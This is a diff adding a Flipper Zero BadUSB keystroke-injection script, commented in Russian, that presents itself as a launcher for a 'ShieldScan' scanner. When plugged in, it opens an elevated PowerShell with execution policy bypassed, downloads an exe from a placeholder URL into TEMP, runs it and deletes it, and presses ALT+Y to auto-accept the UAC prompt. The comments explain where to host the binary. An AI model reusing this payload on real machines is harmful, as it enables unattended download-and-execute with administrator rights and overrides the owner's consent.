@@ -1,0 +1,40 @@
+REM ═══════════════════════════════════════════════════
+REM   ShieldScan BadUSB — Автономный (через интернет)
+REM   Всё на одном Flipper, флешка не нужна
+REM ═══════════════════════════════════════════════════
+REM
+REM   Подготовка:
+REM   1. Скомпилируй ShieldScan.exe через build.bat
+REM   2. Залей ShieldScan.exe куда-нибудь:
+REM      - GitHub: создай репо → Releases → Upload
+REM      - Свой сервер / VPS
+REM      - transfer.sh: curl -T ShieldScan.exe transfer.sh
+REM   3. Замени ССЫЛКУ внизу на свою прямую ссылку
+REM      (должна отдавать .exe напрямую)
+REM   4. Этот файл → SD Flipper: /badusb/
+REM
+REM   ═══════════════════════════════════════════════
+REM   ЗАМЕНИ ССЫЛКУ В СТРОКЕ STRING НИЖЕ:
+REM   ═══════════════════════════════════════════════
+
+DELAY 1000
+
+REM ── Открываем PowerShell от администратора ──
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 1000
+
+REM ── Скачиваем, запускаем, чистим за собой ──
+STRING Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "Write-Host ''ShieldScan — загрузка...'' -F Cyan; $url = ''ВСТАВЬ_СЮДА_ПРЯМУЮ_ССЫЛКУ_НА_EXE''; $exe = ''$env:TEMP\ShieldScan.exe''; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing; if (Test-Path $exe) { Write-Host ''Запуск скана...'' -F Green; & $exe; Remove-Item $exe -Force -ErrorAction SilentlyContinue } else { Write-Host ''Ошибка загрузки'' -F Red } } catch { Write-Host $_.Exception.Message -F Red }; Read-Host ''Нажмите Enter для выхода''"'
+ENTER
+
+REM Ждём UAC-промпт
+DELAY 2500
+ALT y
+
+REM Закрываем первое окно PowerShell
+DELAY 500
+STRING exit
+ENTER
